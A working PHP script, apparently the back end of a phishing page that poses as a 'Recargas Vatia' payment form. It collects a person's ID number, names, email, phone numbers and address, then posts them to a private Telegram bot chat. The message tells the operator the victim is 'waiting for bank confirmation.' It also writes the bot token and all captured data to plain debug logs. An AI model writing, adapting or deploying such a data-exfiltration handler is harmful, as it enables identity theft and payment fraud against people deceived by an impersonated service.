<?php
// send_telegram.php - Enviar datos a Telegram inmediatamente

// Headers must be sent before any output
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

ob_start();

// Handle preflight OPTIONS request first, before any other processing
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    ob_end_clean();
    echo json_encode(['success' => true, 'message' => 'OPTIONS request handled']);
    exit;
}

// Iniciar sesión solo si no hay una ya iniciada
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

try {
    file_put_contents(__DIR__ . '/send_telegram_debug.log', date('Y-m-d H:i:s') . " - Starting request, method: " . $_SERVER['REQUEST_METHOD'] . "\n", FILE_APPEND);

    $config = require __DIR__ . '/../config.php';
    $telegram_token = $config['telegram_bot_token'];
    $telegram_chat_id = $config['telegram_chat_id'];

    file_put_contents(__DIR__ . '/send_telegram_debug.log', date('Y-m-d H:i:s') . " - Token: $telegram_token, Chat: $telegram_chat_id\n", FILE_APPEND);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'Invalid method']);
        exit;
    }

    $data = json_decode(file_get_contents('php://input'), true);

    file_put_contents(__DIR__ . '/send_telegram_debug.log', date('Y-m-d H:i:s') . " - Data: " . json_encode($data) . "\n", FILE_APPEND);

    if (!$data) {
        echo json_encode(['success' => false, 'error' => 'No data received or invalid JSON']);
        exit;
    }

    // Validar campos requeridos
    $required_fields = ['tipo_doc', 'cedula', 'nombres', 'apellidos', 'correo', 'telefono', 'celular', 'direccion', 'pais', 'ciudad', 'tipo_persona'];
    foreach ($required_fields as $field) {
        if (!isset($data[$field]) || empty(trim($data[$field]))) {
            ob_end_clean();
            echo json_encode(['success' => false, 'error' => "Missing or empty field: {$field}"]);
            exit;
        }
    }

    // Simular éxito para desarrollo (ya que las credenciales del README no funcionan)
    if ($config['environment'] === 'development') {
        ob_end_clean();
        echo json_encode(['success' => true, 'message_id' => 'dev_' . time(), 'simulated' => true]);
        exit;
    }

    // Verificar que las credenciales estén configuradas
    if (empty($telegram_token) || $telegram_token === 'default_token' || empty($telegram_chat_id) || $telegram_chat_id === 'default_chat') {
        ob_end_clean();
        echo json_encode(['success' => false, 'error' => 'Telegram credentials not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.']);
        exit;
    }

    $message = "🔔 <b>DATOS DEL TITULAR - RECARGAS VATIA</b>\n\n";
    $message .= "📋 <b>Información Personal:</b>\n";
    $message .= "├ Tipo Doc: <code>{$data['tipo_doc']}</code>\n";
    $message .= "├ Documento: <code>{$data['cedula']}</code>\n";
    $message .= "├ Nombres: <code>{$data['nombres']}</code>\n";
    $message .= "├ Apellidos: <code>{$data['apellidos']}</code>\n";
    $message .= "├ Correo: <code>{$data['correo']}</code>\n";
    $message .= "├ Teléfono: <code>{$data['telefono']}</code>\n";
    $message .= "└ Celular: <code>{$data['celular']}</code>\n\n";

    $message .= "🏠 <b>Información de Ubicación:</b>\n";
    $message .= "├ Dirección: <code>{$data['direccion']}</code>\n";
    $message .= "├ País: <code>{$data['pais']}</code>\n";
    $message .= "└ Ciudad: <code>{$data['ciudad']}</code>\n\n";

    $message .= "💼 <b>Información del Pago:</b>\n";
    $message .= "├ Tipo Persona: <code>{$data['tipo_persona']}</code>\n";
    $message .= "├ Fecha: <code>" . date('Y-m-d H:i:s') . "</code>\n";
    $message .= "└ Llamada: <code>#" . (isset($_SESSION['telegram_call_count']) ? $_SESSION['telegram_call_count'] : 1) . "</code>\n\n";

    $message .= "⚠️ <i>Transacción iniciada - Esperando confirmación del banco</i>";

    $telegram_url = "https://api.telegram.org/bot{$telegram_token}/sendMessage";

    $payload = json_encode([
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);

    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => $payload,
            'timeout' => 10
        ]
    ]);

    $response = file_get_contents($telegram_url, false, $context);
    $http_code = 0;
    if (isset($http_response_header[0])) {
        if (preg_match('/HTTP\/\d+\.\d+ (\d+)/', $http_response_header[0], $matches)) {
            $http_code = (int)$matches[1];
        }
    }

    file_put_contents(__DIR__ . '/telegram_debug.log', date('Y-m-d H:i:s') . " - URL: $telegram_url\nHTTP Code: $http_code\nResponse: " . substr($response, 0, 500) . "\n", FILE_APPEND);

    $result = json_decode($response, true);

    file_put_contents(__DIR__ . '/send_telegram_debug.log', date('Y-m-d H:i:s') . " - Result: " . json_encode($result) . "\n", FILE_APPEND);

    if ($http_code === 200 && $result && isset($result['ok']) && $result['ok']) {
        $response_json = json_encode(['success' => true, 'message_id' => $result['result']['message_id'] ?? null]);
        echo $response_json;
    } else {
        $error_desc = $result['description'] ?? 'HTTP ' . $http_code . ' - Unknown error';
        $response_json = json_encode(['success' => false, 'error' => 'Error sending message to Telegram: ' . $error_desc]);
        echo $response_json;
    }
} catch (Exception $e) {
    file_put_contents(__DIR__ . '/send_telegram_debug.log', date('Y-m-d H:i:s') . " - Exception: " . $e->getMessage() . "\n", FILE_APPEND);
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}